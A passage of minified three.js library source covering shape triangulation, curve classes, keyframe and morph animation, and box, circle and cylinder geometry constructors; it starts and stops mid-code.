r=1e-10,i=t.length,n=!1,a=i-1,o=0;i>o;a=o++){var s=t[a],h=t[o],l=h.x-s.x,c=h.y-s.y;if(Math.abs(c)>r){if(0>c&&(s=t[o],l=-l,h=t[a],c=-c),e.y<s.y||e.y>h.y)continue;if(e.y==s.y){if(e.x==s.x)return!0}else{var u=c*(e.x-s.x)-l*(e.y-s.y);if(0==u)return!0;if(0>u)continue;n=!n}}else{if(e.y!=s.y)continue;if(h.x<=e.x&&e.x<=s.x||s.x<=e.x&&e.x<=h.x)return!0}}return n}var a=r(this.actions);if(0==a.length)return[];if(t===!0)return i(a);var o,s,h,l=[];if(1==a.length)return s=a[0],h=new THREE.Shape,h.actions=s.actions,h.curves=s.curves,l.push(h),l;var c=!THREE.Shape.Utils.isClockWise(a[0].getPoints());c=e?!c:c;var u,E=[],f=[],p=[],d=0;f[d]=void 0,p[d]=[];var m,T;for(m=0,T=a.length;T>m;m++)s=a[m],u=s.getPoints(),o=THREE.Shape.Utils.isClockWise(u),o=e?!o:o,o?(!c&&f[d]&&d++,f[d]={s:new THREE.Shape,p:u},f[d].s.actions=s.actions,f[d].s.curves=s.curves,c&&d++,p[d]=[]):p[d].push({h:s,p:u[0]});if(!f[0])return i(a);if(f.length>1){for(var g=!1,v=[],R=0,y=f.length;y>R;R++)E[R]=[];for(var R=0,y=f.length;y>R;R++)for(var H=p[R],x=0;x<H.length;x++){for(var b=H[x],_=!0,w=0;w<f.length;w++)n(b.p,f[w].p)&&(R!=w&&v.push({froms:R,tos:w,hole:x}),_?(_=!1,E[w].push(b)):g=!0);_&&E[R].push(b)}v.length>0&&(g||(p=E))}var M,S,A;for(m=0,T=f.length;T>m;m++)for(h=f[m].s,l.push(h),M=p[m],S=0,A=M.length;A>S;S++)h.holes.push(M[S].h);return l},THREE.Shape=function(){THREE.Path.apply(this,arguments),this.holes=[]},THREE.Shape.prototype=Object.create(THREE.Path.prototype),THREE.Shape.prototype.constructor=THREE.Shape,THREE.Shape.prototype.extrude=function(e){var t=new THREE.ExtrudeGeometry(this,e);return t},THREE.Shape.prototype.makeGeometry=function(e){var t=new THREE.ShapeGeometry(this,e);return t},THREE.Shape.prototype.getPointsHoles=function(e){var t,r=this.holes.length,i=[];for(t=0;r>t;t++)i[t]=this.holes[t].getTransformedPoints(e,this.bends);return i},THREE.Shape.prototype.getSpacedPointsHoles=function(e){
var t,r=this.holes.length,i=[];for(t=0;r>t;t++)i[t]=this.holes[t].getTransformedSpacedPoints(e,this.bends);return i},THREE.Shape.prototype.extractAllPoints=function(e){return{shape:this.getTransformedPoints(e),holes:this.getPointsHoles(e)}},THREE.Shape.prototype.extractPoints=function(e){return this.useSpacedPoints?this.extractAllSpacedPoints(e):this.extractAllPoints(e)},THREE.Shape.prototype.extractAllSpacedPoints=function(e){return{shape:this.getTransformedSpacedPoints(e),holes:this.getSpacedPointsHoles(e)}},THREE.Shape.Utils={triangulateShape:function(e,t){function r(e,t,r){return e.x!=t.x?e.x<t.x?e.x<=r.x&&r.x<=t.x:t.x<=r.x&&r.x<=e.x:e.y<t.y?e.y<=r.y&&r.y<=t.y:t.y<=r.y&&r.y<=e.y}function i(e,t,i,n,a){var o=1e-10,s=t.x-e.x,h=t.y-e.y,l=n.x-i.x,c=n.y-i.y,u=e.x-i.x,E=e.y-i.y,f=h*l-s*c,p=h*u-s*E;if(Math.abs(f)>o){var d;if(f>0){if(0>p||p>f)return[];if(d=c*u-l*E,0>d||d>f)return[]}else{if(p>0||f>p)return[];if(d=c*u-l*E,d>0||f>d)return[]}if(0==d)return!a||0!=p&&p!=f?[e]:[];if(d==f)return!a||0!=p&&p!=f?[t]:[];if(0==p)return[i];if(p==f)return[n];var m=d/f;return[{x:e.x+m*s,y:e.y+m*h}]}if(0!=p||c*u!=l*E)return[];var T=0==s&&0==h,g=0==l&&0==c;if(T&&g)return e.x!=i.x||e.y!=i.y?[]:[e];if(T)return r(i,n,e)?[e]:[];if(g)return r(e,t,i)?[i]:[];var v,R,y,H,x,b,_,w;return 0!=s?(e.x<t.x?(v=e,y=e.x,R=t,H=t.x):(v=t,y=t.x,R=e,H=e.x),i.x<n.x?(x=i,_=i.x,b=n,w=n.x):(x=n,_=n.x,b=i,w=i.x)):(e.y<t.y?(v=e,y=e.y,R=t,H=t.y):(v=t,y=t.y,R=e,H=e.y),i.y<n.y?(x=i,_=i.y,b=n,w=n.y):(x=n,_=n.y,b=i,w=i.y)),_>=y?_>H?[]:H==_?a?[]:[x]:w>=H?[x,R]:[x,b]:y>w?[]:y==w?a?[]:[v]:w>=H?[v,R]:[v,b]}function n(e,t,r,i){var n=1e-10,a=t.x-e.x,o=t.y-e.y,s=r.x-e.x,h=r.y-e.y,l=i.x-e.x,c=i.y-e.y,u=a*h-o*s,E=a*c-o*l;if(Math.abs(u)>n){var f=l*h-c*s;return u>0?E>=0&&f>=0:E>=0||f>=0}return E>0}function a(e,t){function r(e,t){var r=g.length-1,i=e-1;0>i&&(i=r);var a=e+1;a>r&&(a=0);var o=n(g[e],g[i],g[a],s[t]);if(!o)return!1;var h=s.length-1,l=t-1;0>l&&(l=h);var c=t+1;return c>h&&(c=0),o=n(s[t],s[l],s[c],g[e]),o?!0:!1}function a(e,t){var r,n,a;for(r=0;r<g.length;r++)if(n=r+1,n%=g.length,a=i(e,t,g[r],g[n],!0),a.length>0)return!0;return!1}function o(e,r){var n,a,o,s,h;for(n=0;n<v.length;n++)for(a=t[v[n]],o=0;o<a.length;o++)if(s=o+1,s%=a.length,h=i(e,r,a[o],a[s],!0),h.length>0)return!0;return!1}for(var s,h,l,c,u,E,f,p,d,m,T,g=e.concat(),v=[],R=[],y=0,H=t.length;H>y;y++)v.push(y);for(var x=0,b=2*v.length;v.length>0;){if(b--,0>b){console.log("Infinite Loop! Holes left:"+v.length+", Probably Hole outside Shape!");break}for(l=x;l<g.length;l++){c=g[l],h=-1;for(var y=0;y<v.length;y++)if(E=v[y],f=c.x+":"+c.y+":"+E,void 0===R[f]){s=t[E];for(var _=0;_<s.length;_++)if(u=s[_],r(l,_)&&!a(c,u)&&!o(c,u)){h=_,v.splice(y,1),p=g.slice(0,l+1),d=g.slice(l),m=s.slice(h),T=s.slice(0,h+1),g=p.concat(m).concat(T).concat(d),x=l;break}if(h>=0)break;R[f]=!0}if(h>=0)break}}return g}for(var o,s,h,l,c,u,E={},f=e.concat(),p=0,d=t.length;d>p;p++)Array.prototype.push.apply(f,t[p]);for(o=0,s=f.length;s>o;o++)c=f[o].x+":"+f[o].y,void 0!==E[c]&&THREE.warn("THREE.Shape: Duplicate point",c),E[c]=o;var m=a(e,t),T=THREE.FontUtils.Triangulate(m,!1);for(o=0,s=T.length;s>o;o++)for(l=T[o],h=0;3>h;h++)c=l[h].x+":"+l[h].y,u=E[c],void 0!==u&&(l[h]=u);return T.concat()},isClockWise:function(e){return THREE.FontUtils.Triangulate.area(e)<0},b2p0:function(e,t){var r=1-e;return r*r*t},b2p1:function(e,t){return 2*(1-e)*e*t},b2p2:function(e,t){return e*e*t},b2:function(e,t,r,i){return this.b2p0(e,t)+this.b2p1(e,r)+this.b2p2(e,i)},b3p0:function(e,t){var r=1-e;return r*r*r*t},b3p1:function(e,t){var r=1-e;return 3*r*r*e*t},b3p2:function(e,t){var r=1-e;return 3*r*e*e*t},b3p3:function(e,t){return e*e*e*t},b3:function(e,t,r,i,n){return this.b3p0(e,t)+this.b3p1(e,r)+this.b3p2(e,i)+this.b3p3(e,n)}},THREE.LineCurve=function(e,t){this.v1=e,this.v2=t},THREE.LineCurve.prototype=Object.create(THREE.Curve.prototype),THREE.LineCurve.prototype.constructor=THREE.LineCurve,THREE.LineCurve.prototype.getPoint=function(e){var t=this.v2.clone().sub(this.v1);return t.multiplyScalar(e).add(this.v1),t},THREE.LineCurve.prototype.getPointAt=function(e){return this.getPoint(e)},THREE.LineCurve.prototype.getTangent=function(e){var t=this.v2.clone().sub(this.v1);return t.normalize()},THREE.QuadraticBezierCurve=function(e,t,r){this.v0=e,this.v1=t,this.v2=r},THREE.QuadraticBezierCurve.prototype=Object.create(THREE.Curve.prototype),THREE.QuadraticBezierCurve.prototype.constructor=THREE.QuadraticBezierCurve,THREE.QuadraticBezierCurve.prototype.getPoint=function(e){var t=new THREE.Vector2;return t.x=THREE.Shape.Utils.b2(e,this.v0.x,this.v1.x,this.v2.x),t.y=THREE.Shape.Utils.b2(e,this.v0.y,this.v1.y,this.v2.y),t},THREE.QuadraticBezierCurve.prototype.getTangent=function(e){var t=new THREE.Vector2;return t.x=THREE.Curve.Utils.tangentQuadraticBezier(e,this.v0.x,this.v1.x,this.v2.x),t.y=THREE.Curve.Utils.tangentQuadraticBezier(e,this.v0.y,this.v1.y,this.v2.y),t.normalize()},THREE.CubicBezierCurve=function(e,t,r,i){this.v0=e,this.v1=t,this.v2=r,this.v3=i},THREE.CubicBezierCurve.prototype=Object.create(THREE.Curve.prototype),THREE.CubicBezierCurve.prototype.constructor=THREE.CubicBezierCurve,THREE.CubicBezierCurve.prototype.getPoint=function(e){var t,r;return t=THREE.Shape.Utils.b3(e,this.v0.x,this.v1.x,this.v2.x,this.v3.x),r=THREE.Shape.Utils.b3(e,this.v0.y,this.v1.y,this.v2.y,this.v3.y),new THREE.Vector2(t,r)},THREE.CubicBezierCurve.prototype.getTangent=function(e){var t,r;t=THREE.Curve.Utils.tangentCubicBezier(e,this.v0.x,this.v1.x,this.v2.x,this.v3.x),r=THREE.Curve.Utils.tangentCubicBezier(e,this.v0.y,this.v1.y,this.v2.y,this.v3.y);var i=new THREE.Vector2(t,r);return i.normalize(),i},THREE.SplineCurve=function(e){this.points=void 0==e?[]:e},THREE.SplineCurve.prototype=Object.create(THREE.Curve.prototype),THREE.SplineCurve.prototype.constructor=THREE.SplineCurve,THREE.SplineCurve.prototype.getPoint=function(e){var t=this.points,r=(t.length-1)*e,i=Math.floor(r),n=r-i,a=t[0==i?i:i-1],o=t[i],s=t[i>t.length-2?t.length-1:i+1],h=t[i>t.length-3?t.length-1:i+2],l=new THREE.Vector2;return l.x=THREE.Curve.Utils.interpolate(a.x,o.x,s.x,h.x,n),l.y=THREE.Curve.Utils.interpolate(a.y,o.y,s.y,h.y,n),l},THREE.EllipseCurve=function(e,t,r,i,n,a,o){this.aX=e,this.aY=t,this.xRadius=r,this.yRadius=i,this.aStartAngle=n,this.aEndAngle=a,this.aClockwise=o},THREE.EllipseCurve.prototype=Object.create(THREE.Curve.prototype),THREE.EllipseCurve.prototype.constructor=THREE.EllipseCurve,THREE.EllipseCurve.prototype.getPoint=function(e){var t=this.aEndAngle-this.aStartAngle;0>t&&(t+=2*Math.PI),t>2*Math.PI&&(t-=2*Math.PI);var r;r=this.aClockwise===!0?this.aEndAngle+(1-e)*(2*Math.PI-t):this.aStartAngle+e*t;var i=new THREE.Vector2;return i.x=this.aX+this.xRadius*Math.cos(r),i.y=this.aY+this.yRadius*Math.sin(r),i},THREE.ArcCurve=function(e,t,r,i,n,a){THREE.EllipseCurve.call(this,e,t,r,r,i,n,a)},THREE.ArcCurve.prototype=Object.create(THREE.EllipseCurve.prototype),THREE.ArcCurve.prototype.constructor=THREE.ArcCurve,THREE.LineCurve3=THREE.Curve.create(function(e,t){this.v1=e,this.v2=t},function(e){var t=new THREE.Vector3;return t.subVectors(this.v2,this.v1),t.multiplyScalar(e),t.add(this.v1),t}),THREE.QuadraticBezierCurve3=THREE.Curve.create(function(e,t,r){this.v0=e,this.v1=t,this.v2=r},function(e){var t=new THREE.Vector3;return t.x=THREE.Shape.Utils.b2(e,this.v0.x,this.v1.x,this.v2.x),t.y=THREE.Shape.Utils.b2(e,this.v0.y,this.v1.y,this.v2.y),t.z=THREE.Shape.Utils.b2(e,this.v0.z,this.v1.z,this.v2.z),t}),THREE.CubicBezierCurve3=THREE.Curve.create(function(e,t,r,i){this.v0=e,this.v1=t,this.v2=r,this.v3=i},function(e){var t=new THREE.Vector3;return t.x=THREE.Shape.Utils.b3(e,this.v0.x,this.v1.x,this.v2.x,this.v3.x),t.y=THREE.Shape.Utils.b3(e,this.v0.y,this.v1.y,this.v2.y,this.v3.y),t.z=THREE.Shape.Utils.b3(e,this.v0.z,this.v1.z,this.v2.z,this.v3.z),t}),THREE.SplineCurve3=THREE.Curve.create(function(e){this.points=void 0==e?[]:e},function(e){var t=this.points,r=(t.length-1)*e,i=Math.floor(r),n=r-i,a=t[0==i?i:i-1],o=t[i],s=t[i>t.length-2?t.length-1:i+1],h=t[i>t.length-3?t.length-1:i+2],l=new THREE.Vector3;return l.x=THREE.Curve.Utils.interpolate(a.x,o.x,s.x,h.x,n),l.y=THREE.Curve.Utils.interpolate(a.y,o.y,s.y,h.y,n),l.z=THREE.Curve.Utils.interpolate(a.z,o.z,s.z,h.z,n),l}),THREE.ClosedSplineCurve3=THREE.Curve.create(function(e){this.points=void 0==e?[]:e},function(e){var t=this.points,r=(t.length-0)*e,i=Math.floor(r),n=r-i;i+=i>0?0:(Math.floor(Math.abs(i)/t.length)+1)*t.length;var a=t[(i-1)%t.length],o=t[i%t.length],s=t[(i+1)%t.length],h=t[(i+2)%t.length],l=new THREE.Vector3;return l.x=THREE.Curve.Utils.interpolate(a.x,o.x,s.x,h.x,n),l.y=THREE.Curve.Utils.interpolate(a.y,o.y,s.y,h.y,n),l.z=THREE.Curve.Utils.interpolate(a.z,o.z,s.z,h.z,n),l}),THREE.AnimationHandler={LINEAR:0,CATMULLROM:1,CATMULLROM_FORWARD:2,add:function(){THREE.warn("THREE.AnimationHandler.add() has been deprecated.")},get:function(){THREE.warn("THREE.AnimationHandler.get() has been deprecated.")},remove:function(){THREE.warn("THREE.AnimationHandler.remove() has been deprecated.")},animations:[],init:function(e){if(e.initialized===!0)return e;for(var t=0;t<e.hierarchy.length;t++){for(var r=0;r<e.hierarchy[t].keys.length;r++)if(e.hierarchy[t].keys[r].time<0&&(e.hierarchy[t].keys[r].time=0),void 0!==e.hierarchy[t].keys[r].rot&&!(e.hierarchy[t].keys[r].rot instanceof THREE.Quaternion)){var i=e.hierarchy[t].keys[r].rot;e.hierarchy[t].keys[r].rot=(new THREE.Quaternion).fromArray(i)}if(e.hierarchy[t].keys.length&&void 0!==e.hierarchy[t].keys[0].morphTargets){for(var n={},r=0;r<e.hierarchy[t].keys.length;r++)for(var a=0;a<e.hierarchy[t].keys[r].morphTargets.length;a++){var o=e.hierarchy[t].keys[r].morphTargets[a];n[o]=-1}e.hierarchy[t].usedMorphTargets=n;for(var r=0;r<e.hierarchy[t].keys.length;r++){var s={};for(var o in n){for(var a=0;a<e.hierarchy[t].keys[r].morphTargets.length;a++)if(e.hierarchy[t].keys[r].morphTargets[a]===o){s[o]=e.hierarchy[t].keys[r].morphTargetsInfluences[a];break}a===e.hierarchy[t].keys[r].morphTargets.length&&(s[o]=0)}e.hierarchy[t].keys[r].morphTargetsInfluences=s}}for(var r=1;r<e.hierarchy[t].keys.length;r++)e.hierarchy[t].keys[r].time===e.hierarchy[t].keys[r-1].time&&(e.hierarchy[t].keys.splice(r,1),r--);for(var r=0;r<e.hierarchy[t].keys.length;r++)e.hierarchy[t].keys[r].index=r}return e.initialized=!0,e},parse:function(e){var t=function(e,r){r.push(e);for(var i=0;i<e.children.length;i++)t(e.children[i],r)},r=[];if(e instanceof THREE.SkinnedMesh)for(var i=0;i<e.skeleton.bones.length;i++)r.push(e.skeleton.bones[i]);else t(e,r);return r},play:function(e){-1===this.animations.indexOf(e)&&this.animations.push(e)},stop:function(e){var t=this.animations.indexOf(e);-1!==t&&this.animations.splice(t,1)},update:function(e){for(var t=0;t<this.animations.length;t++)this.animations[t].resetBlendWeights();for(var t=0;t<this.animations.length;t++)this.animations[t].update(e)}},THREE.Animation=function(e,t){this.root=e,this.data=THREE.AnimationHandler.init(t),this.hierarchy=THREE.AnimationHandler.parse(e),this.currentTime=0,this.timeScale=1,this.isPlaying=!1,this.loop=!0,this.weight=0,this.interpolationType=THREE.AnimationHandler.LINEAR},THREE.Animation.prototype={constructor:THREE.Animation,keyTypes:["pos","rot","scl"],play:function(e,t){this.currentTime=void 0!==e?e:0,this.weight=void 0!==t?t:1,this.isPlaying=!0,this.reset(),THREE.AnimationHandler.play(this)},stop:function(){this.isPlaying=!1,THREE.AnimationHandler.stop(this)},reset:function(){for(var e=0,t=this.hierarchy.length;t>e;e++){var r=this.hierarchy[e];void 0===r.animationCache&&(r.animationCache={animations:{},blending:{positionWeight:0,quaternionWeight:0,scaleWeight:0}});var i=this.data.name,n=r.animationCache.animations,a=n[i];void 0===a&&(a={prevKey:{pos:0,rot:0,scl:0},nextKey:{pos:0,rot:0,scl:0},originalMatrix:r.matrix},n[i]=a);for(var o=0;3>o;o++){for(var s=this.keyTypes[o],h=this.data.hierarchy[e].keys[0],l=this.getNextKeyWith(s,e,1);l.time<this.currentTime&&l.index>h.index;)h=l,l=this.getNextKeyWith(s,e,l.index+1);a.prevKey[s]=h,a.nextKey[s]=l}}},resetBlendWeights:function(){for(var e=0,t=this.hierarchy.length;t>e;e++){var r=this.hierarchy[e],i=r.animationCache;if(void 0!==i){var n=i.blending;n.positionWeight=0,n.quaternionWeight=0,n.scaleWeight=0}}},update:function(){var e=[],t=new THREE.Vector3,r=new THREE.Vector3,i=new THREE.Quaternion,n=function(e,t){var r,i,n,o,s,h,l,c,u,E=[],f=[];return r=(e.length-1)*t,i=Math.floor(r),n=r-i,E[0]=0===i?i:i-1,E[1]=i,E[2]=i>e.length-2?i:i+1,E[3]=i>e.length-3?i:i+2,h=e[E[0]],l=e[E[1]],c=e[E[2]],u=e[E[3]],o=n*n,s=n*o,f[0]=a(h[0],l[0],c[0],u[0],n,o,s),f[1]=a(h[1],l[1],c[1],u[1],n,o,s),f[2]=a(h[2],l[2],c[2],u[2],n,o,s),f},a=function(e,t,r,i,n,a,o){var s=.5*(r-e),h=.5*(i-t);return(2*(t-r)+s+h)*o+(-3*(t-r)-2*s-h)*a+s*n+t};return function(a){if(this.isPlaying!==!1&&(this.currentTime+=a*this.timeScale,0!==this.weight)){var o=this.data.length;(this.currentTime>o||this.currentTime<0)&&(this.loop?(this.currentTime%=o,this.currentTime<0&&(this.currentTime+=o),this.reset()):this.stop());for(var s=0,h=this.hierarchy.length;h>s;s++)for(var l=this.hierarchy[s],c=l.animationCache.animations[this.data.name],u=l.animationCache.blending,E=0;3>E;E++){var f=this.keyTypes[E],p=c.prevKey[f],d=c.nextKey[f];if(this.timeScale>0&&d.time<=this.currentTime||this.timeScale<0&&p.time>=this.currentTime){for(p=this.data.hierarchy[s].keys[0],d=this.getNextKeyWith(f,s,1);d.time<this.currentTime&&d.index>p.index;)p=d,d=this.getNextKeyWith(f,s,d.index+1);c.prevKey[f]=p,c.nextKey[f]=d}var m=(this.currentTime-p.time)/(d.time-p.time),T=p[f],g=d[f];if(0>m&&(m=0),m>1&&(m=1),"pos"===f){if(this.interpolationType===THREE.AnimationHandler.LINEAR){r.x=T[0]+(g[0]-T[0])*m,r.y=T[1]+(g[1]-T[1])*m,r.z=T[2]+(g[2]-T[2])*m;var v=this.weight/(this.weight+u.positionWeight);l.position.lerp(r,v),u.positionWeight+=this.weight}else if(this.interpolationType===THREE.AnimationHandler.CATMULLROM||this.interpolationType===THREE.AnimationHandler.CATMULLROM_FORWARD){e[0]=this.getPrevKeyWith("pos",s,p.index-1).pos,e[1]=T,e[2]=g,e[3]=this.getNextKeyWith("pos",s,d.index+1).pos,m=.33*m+.33;var R=n(e,m),v=this.weight/(this.weight+u.positionWeight);u.positionWeight+=this.weight;var y=l.position;if(y.x=y.x+(R[0]-y.x)*v,y.y=y.y+(R[1]-y.y)*v,y.z=y.z+(R[2]-y.z)*v,this.interpolationType===THREE.AnimationHandler.CATMULLROM_FORWARD){var H=n(e,1.01*m);t.set(H[0],H[1],H[2]),t.sub(y),t.y=0,t.normalize();var x=Math.atan2(t.x,t.z);l.rotation.set(0,x,0)}}}else if("rot"===f)if(THREE.Quaternion.slerp(T,g,i,m),0===u.quaternionWeight)l.quaternion.copy(i),u.quaternionWeight=this.weight;else{var v=this.weight/(this.weight+u.quaternionWeight);THREE.Quaternion.slerp(l.quaternion,i,l.quaternion,v),u.quaternionWeight+=this.weight}else if("scl"===f){r.x=T[0]+(g[0]-T[0])*m,r.y=T[1]+(g[1]-T[1])*m,r.z=T[2]+(g[2]-T[2])*m;var v=this.weight/(this.weight+u.scaleWeight);l.scale.lerp(r,v),u.scaleWeight+=this.weight}}return!0}}}(),getNextKeyWith:function(e,t,r){var i=this.data.hierarchy[t].keys;for(this.interpolationType===THREE.AnimationHandler.CATMULLROM||this.interpolationType===THREE.AnimationHandler.CATMULLROM_FORWARD?r=r<i.length-1?r:i.length-1:r%=i.length;r<i.length;r++)if(void 0!==i[r][e])return i[r];return this.data.hierarchy[t].keys[0]},getPrevKeyWith:function(e,t,r){var i=this.data.hierarchy[t].keys;for(r=this.interpolationType===THREE.AnimationHandler.CATMULLROM||this.interpolationType===THREE.AnimationHandler.CATMULLROM_FORWARD?r>0?r:0:r>=0?r:r+i.length;r>=0;r--)if(void 0!==i[r][e])return i[r];return this.data.hierarchy[t].keys[i.length-1]}},THREE.KeyFrameAnimation=function(e){this.root=e.node,this.data=THREE.AnimationHandler.init(e),this.hierarchy=THREE.AnimationHandler.parse(this.root),this.currentTime=0,this.timeScale=.001,this.isPlaying=!1,this.isPaused=!0,this.loop=!0;for(var t=0,r=this.hierarchy.length;r>t;t++){var i=this.data.hierarchy[t].keys,n=this.data.hierarchy[t].sids,a=this.hierarchy[t];if(i.length&&n){for(var o=0;o<n.length;o++){var s=n[o],h=this.getNextKeyWith(s,t,0);h&&h.apply(s)}a.matrixAutoUpdate=!1,this.data.hierarchy[t].node.updateMatrix(),a.matrixWorldNeedsUpdate=!0}}},THREE.KeyFrameAnimation.prototype={constructor:THREE.KeyFrameAnimation,play:function(e){if(this.currentTime=void 0!==e?e:0,this.isPlaying===!1){this.isPlaying=!0;var t,r,i,n=this.hierarchy.length;for(t=0;n>t;t++){r=this.hierarchy[t],i=this.data.hierarchy[t],void 0===i.animationCache&&(i.animationCache={},i.animationCache.prevKey=null,i.animationCache.nextKey=null,i.animationCache.originalMatrix=r.matrix);var a=this.data.hierarchy[t].keys;a.length&&(i.animationCache.prevKey=a[0],i.animationCache.nextKey=a[1],this.startTime=Math.min(a[0].time,this.startTime),this.endTime=Math.max(a[a.length-1].time,this.endTime))}this.update(0)}this.isPaused=!1,THREE.AnimationHandler.play(this)},stop:function(){this.isPlaying=!1,this.isPaused=!1,THREE.AnimationHandler.stop(this);for(var e=0;e<this.data.hierarchy.length;e++){var t=this.hierarchy[e],r=this.data.hierarchy[e];if(void 0!==r.animationCache){var i=r.animationCache.originalMatrix;i.copy(t.matrix),t.matrix=i,delete r.animationCache}}},update:function(e){if(this.isPlaying!==!1){this.currentTime+=e*this.timeScale;var t=this.data.length;this.loop===!0&&this.currentTime>t&&(this.currentTime%=t),this.currentTime=Math.min(this.currentTime,t);for(var r=0,i=this.hierarchy.length;i>r;r++){var n=this.hierarchy[r],a=this.data.hierarchy[r],o=a.keys,s=a.animationCache;if(o.length){var h=s.prevKey,l=s.nextKey;if(l.time<=this.currentTime){for(;l.time<this.currentTime&&l.index>h.index;)h=l,l=o[h.index+1];s.prevKey=h,s.nextKey=l}l.time>=this.currentTime?h.interpolate(l,this.currentTime):h.interpolate(l,l.time),this.data.hierarchy[r].node.updateMatrix(),n.matrixWorldNeedsUpdate=!0}}}},getNextKeyWith:function(e,t,r){var i=this.data.hierarchy[t].keys;for(r%=i.length;r<i.length;r++)if(i[r].hasTarget(e))return i[r];return i[0]},getPrevKeyWith:function(e,t,r){var i=this.data.hierarchy[t].keys;for(r=r>=0?r:r+i.length;r>=0;r--)if(i[r].hasTarget(e))return i[r];return i[i.length-1]}},THREE.MorphAnimation=function(e){this.mesh=e,this.frames=e.morphTargetInfluences.length,this.currentTime=0,this.duration=1e3,this.loop=!0,this.lastFrame=0,this.currentFrame=0,this.isPlaying=!1},THREE.MorphAnimation.prototype={constructor:THREE.MorphAnimation,play:function(){this.isPlaying=!0},pause:function(){this.isPlaying=!1},update:function(e){if(this.isPlaying!==!1){this.currentTime+=e,this.loop===!0&&this.currentTime>this.duration&&(this.currentTime%=this.duration),this.currentTime=Math.min(this.currentTime,this.duration);var t=this.duration/this.frames,r=Math.floor(this.currentTime/t),i=this.mesh.morphTargetInfluences;r!=this.currentFrame&&(i[this.lastFrame]=0,i[this.currentFrame]=1,i[r]=0,this.lastFrame=this.currentFrame,this.currentFrame=r),i[r]=this.currentTime%t/t,i[this.lastFrame]=1-i[r]}}},THREE.BoxGeometry=function(e,t,r,i,n,a){function o(e,t,r,i,n,a,o,h){var l,c,u,E=s.widthSegments,f=s.heightSegments,p=n/2,d=a/2,m=s.vertices.length;"x"===e&&"y"===t||"y"===e&&"x"===t?l="z":"x"===e&&"z"===t||"z"===e&&"x"===t?(l="y",f=s.depthSegments):("z"===e&&"y"===t||"y"===e&&"z"===t)&&(l="x",E=s.depthSegments);var T=E+1,g=f+1,v=n/E,R=a/f,y=new THREE.Vector3;for(y[l]=o>0?1:-1,u=0;g>u;u++)for(c=0;T>c;c++){var H=new THREE.Vector3;H[e]=(c*v-p)*r,H[t]=(u*R-d)*i,H[l]=o,s.vertices.push(H)}for(u=0;f>u;u++)for(c=0;E>c;c++){var x=c+T*u,b=c+T*(u+1),_=c+1+T*(u+1),w=c+1+T*u,M=new THREE.Vector2(c/E,1-u/f),S=new THREE.Vector2(c/E,1-(u+1)/f),A=new THREE.Vector2((c+1)/E,1-(u+1)/f),C=new THREE.Vector2((c+1)/E,1-u/f),L=new THREE.Face3(x+m,b+m,w+m);L.normal.copy(y),L.vertexNormals.push(y.clone(),y.clone(),y.clone()),L.materialIndex=h,s.faces.push(L),s.faceVertexUvs[0].push([M,S,C]),L=new THREE.Face3(b+m,_+m,w+m),L.normal.copy(y),L.vertexNormals.push(y.clone(),y.clone(),y.clone()),L.materialIndex=h,s.faces.push(L),s.faceVertexUvs[0].push([S.clone(),A,C.clone()])}}THREE.Geometry.call(this),this.type="BoxGeometry",this.parameters={width:e,height:t,depth:r,widthSegments:i,heightSegments:n,depthSegments:a},this.widthSegments=i||1,this.heightSegments=n||1,this.depthSegments=a||1;var s=this,h=e/2,l=t/2,c=r/2;o("z","y",-1,-1,r,t,h,0),o("z","y",1,-1,r,t,-h,1),o("x","z",1,1,e,r,l,2),o("x","z",1,-1,e,r,-l,3),o("x","y",1,-1,e,t,c,4),o("x","y",-1,-1,e,t,-c,5),this.mergeVertices()},THREE.BoxGeometry.prototype=Object.create(THREE.Geometry.prototype),THREE.BoxGeometry.prototype.constructor=THREE.BoxGeometry,THREE.CircleGeometry=function(e,t,r,i){THREE.Geometry.call(this),this.type="CircleGeometry",this.parameters={radius:e,segments:t,thetaStart:r,thetaLength:i},e=e||50,t=void 0!==t?Math.max(3,t):8,r=void 0!==r?r:0,i=void 0!==i?i:2*Math.PI;var n,a=[],o=new THREE.Vector3,s=new THREE.Vector2(.5,.5);for(this.vertices.push(o),a.push(s),n=0;t>=n;n++){var h=new THREE.Vector3,l=r+n/t*i;h.x=e*Math.cos(l),h.y=e*Math.sin(l),this.vertices.push(h),a.push(new THREE.Vector2((h.x/e+1)/2,(h.y/e+1)/2))}var c=new THREE.Vector3(0,0,1);for(n=1;t>=n;n++)this.faces.push(new THREE.Face3(n,n+1,0,[c.clone(),c.clone(),c.clone()])),this.faceVertexUvs[0].push([a[n].clone(),a[n+1].clone(),s.clone()]);this.computeFaceNormals(),this.boundingSphere=new THREE.Sphere(new THREE.Vector3,e)},THREE.CircleGeometry.prototype=Object.create(THREE.Geometry.prototype),THREE.CircleGeometry.prototype.constructor=THREE.CircleGeometry,THREE.CubeGeometry=function(e,t,r,i,n,a){return THREE.warn("THREE.CubeGeometry has been renamed to THREE.BoxGeometry."),new THREE.BoxGeometry(e,t,r,i,n,a)},THREE.CylinderGeometry=function(e,t,r,i,n,a,o,s){THREE.Geometry.call(this),this.type="CylinderGeometry",this.parameters={radiusTop:e,radiusBottom:t,height:r,radialSegments:i,heightSegments:n,openEnded:a,thetaStart:o,thetaLength:s},e=void 0!==e?e:20,t=void 0!==t?t:20,r=void 0!==r?r:100,i=i||8,n=n||1,a=void 0!==a?a:!1,o=void 0!==o?o:0,s=void 0!==s?s:2*Math.PI;var h,l,c=r/2,u=[],E=[];for(l=0;n>=l;l++){var f=[],p=[],d=l/n,m=d*(t-e)+e;for(h=0;i>=h;h++){var T=h/i,g=new THREE.Vector3;g.x=m*Math.sin(T*s+o),g.y=-d*r+c,g.z=m*Math.cos(T*s+o),this.vertices.push(g),f.push(this.vertices.length-1),p.push(new THREE.Vector2(T,1-d))}u.push(f),E.push(p)}var v,R,y=(t-e)/r;for(h=0;i>h;h++)for(0!==e?(v=this.vertices[u[0][h]].clone(),R=this.vertices[u[0][h+1]].clone()):(v=this.vertices[u[1][h]].clone(),R=this.vertices[u[1][h+1]].clone()),v.setY(Math.sqrt(v.x*v.x+v.z*v.z)*y).normalize(),R.setY(Math.sqrt(R.x*R.x+R.z*R.z)*y).normalize(),l=0;n>l;l++){var H=u[l][h],x=u[l+1][h],b=u[l+1][h+1],_=u[l][h+1],w=v.clone(),M=v.clone(),S=R.clone(),A=R.clone(),C=E[l][h].clone(),L=E[l+1][h].clone(),P=E[l+1][h+1].clone(),F=E[l][h+1].clone();this.faces.push(new THREE.Face3(H,x,_,[w,M,A])),this.faceVertexUvs[0].push([C,L,F]),this.faces.push(new THREE.Face3(x,b,_,[M.clone(),S,A.clone()])),this.faceVertexUvs[0].push([L.clone(),P,F.clone()])}if(a===!1&&e>0)for(this.vertices.push(new 